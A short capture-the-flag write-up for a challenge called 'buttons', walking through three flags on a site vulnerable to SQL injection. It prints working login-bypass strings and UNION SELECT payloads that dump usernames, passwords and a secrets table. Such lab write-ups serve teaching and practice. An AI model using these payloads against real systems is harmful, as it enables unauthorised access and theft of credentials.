# Write up for buttons

## Overview

For this challenge we are exploiting a website vulnerable to SQL injection. https://book.hacktricks.xyz/pentesting-web/sql-injection and 
https://dev.mysql.com/doc/refman/8.4/en/information-schema.html provide useful information for SQL injection.

## Solution

### Flag 1

Looking around the website, we see we can click a button and then log in to submit a score. Logging in with 
```
Username: ' OR username='admin' --
Password: ' OR '1'='1
```
we can log into the admin account and get the first flag

### Flag 2

Then logging in with:
```
Username: admin
Password: ' OR '1'='1
```
We enter as the "default-user". From there, we can use the search scores to perform another SQL injection.
Here we can enter:
```
 ' UNION SELECT username, password FROM users -- 
```
to get the secret users, which includes the flag as the password to "supersecretuser".

### Flag 3

Again from "default-user" we can perform another SQL injection.
Again we can use the search to enter:
```
' UNION SELECT secret, NULL FROM secrets -- 
```
to get the final flag, which is a secret username.
